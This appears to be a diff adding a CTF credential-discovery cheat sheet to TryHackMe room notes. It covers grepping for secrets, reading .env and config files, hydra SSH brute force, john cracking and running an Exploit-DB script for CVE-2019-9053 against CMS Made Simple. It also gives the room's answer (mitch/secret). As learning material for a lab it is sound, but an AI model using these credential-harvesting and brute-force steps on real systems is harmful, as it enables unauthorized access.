@@ -320,6 +320,207 @@ https://tryhackme.com/r/room/sqlinjectionlm
 ### 5. What's the password?
 
 
+## Password & Credential Discovery Cheat Sheet
+
+**In CTFs, passwords or credentials are commonly obtained from the following sources:**
+
+* **Source Code**
+
+  ```bash
+  curl http://MACHINE_IP
+  ```
+
+  Browser: `Ctrl+U`
+
+* **robots.txt**
+
+  ```bash
+  curl http://MACHINE_IP/robots.txt
+  ```
+
+* **Hidden Directories**
+
+  ```bash
+  gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
+  ```
+
+* **Configuration Files**
+
+  ```bash
+  cat config.php
+  cat settings.php
+  ```
+
+* **`.env` Files**
+
+  ```bash
+  cat .env
+  ```
+
+* **Backup Files**
+
+  ```bash
+  find /var/www -type f -name "*.bak" 2>/dev/null
+  ```
+
+* **Database Records**
+
+  ```bash
+  mysql -u USERNAME -p
+  ```
+
+  ```sql
+  SHOW DATABASES;
+  SHOW TABLES;
+  SELECT * FROM users;
+  ```
+
+* **Password Hashes**
+
+  ```bash
+  hashid HASH
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  ```
+
+  Lookup: `CrackStation` / `Hashes.com`
+
+* **Password Testing / Hydra**
+
+  If you discover a username and SSH is available:
+
+  ```bash
+  hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
+  ```
+
+  **Simple CTF Example:**
+
+  ```text
+  Username: mitch
+  Password: secret
+  ```
+
+* **PCAP / Network Traffic**
+
+  ```text
+  http.request.method == "POST"
+  ftp
+  telnet
+  ```
+
+  Wireshark: `Follow → TCP Stream`
+
+* **User Files**
+
+  ```bash
+  grep -RniE "password|secret" /home 2>/dev/null
+  ```
+
+* **Credential Reuse**
+
+  ```bash
+  ssh USERNAME@MACHINE_IP
+  ftp MACHINE_IP
+  ```
+  * **Vulnerable Application / Exploit**
+
+  Search for a known exploit:
+
+  ```bash
+  searchsploit "CMS Made Simple"
+  ```
+
+  Save the Exploit-DB Python code as:
+
+  ```text
+  exploit.py
+  ```
+
+  Run the exploit:
+
+  ```bash
+  python3 exploit.py -u http://MACHINE_IP/simple/
+  ```
+
+  > **Why Python?** Python is used to **run the exploit script**. Python itself is not the exploit.
+
+  Possible output:
+
+  ```text
+  Username + Salt + Password Hash
+  ```
+
+  If the exploit supports cracking:
+
+  ```bash
+  python3 exploit.py -u http://MACHINE_IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+  ```
+
+### 5. What's the password?
+
+### **Vulnerable Application / Exploit**
+
+First, search for a known exploit:
+
+```bash
+searchsploit "CMS Made Simple"
+```
+
+If an exploit is available on Exploit-DB, copy the Python exploit code to the AttackBox/Kali machine and save it as a `.py` file:
+
+```bash
+nano exploit.py
+```
+
+Paste the exploit code, then save the file as:
+
+```text
+exploit.py
+```
+
+> **Why Python?** Python is used to **run the exploit script** for CVE-2019-9053. Python itself is not the exploit.
+
+Run the exploit against the target:
+
+```bash
+python3 exploit.py -u http://MACHINE_IP/simple/
+```
+
+> **Note:** Some older Exploit-DB scripts were written for Python 2 and may produce errors when run with Python 3. They may require minor syntax updates or the appropriate Python version.
+
+The exploit may reveal information such as:
+
+```text
+Username
+Salt
+Password Hash
+```
+
+For example:
+
+```text
+Username: mitch
+```
+
+Once a valid username is discovered, continue with the appropriate credential-testing step for the CTF. For example, if SSH is available and the challenge permits password testing:
+
+```bash
+hydra -l mitch -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
+```
+
+Example result:
+
+```text
+Username: mitch
+Password: secret
+```
+
+
+
+  
+
+
+
+
 
 ### 6. Where can you login with the details obtained?
 
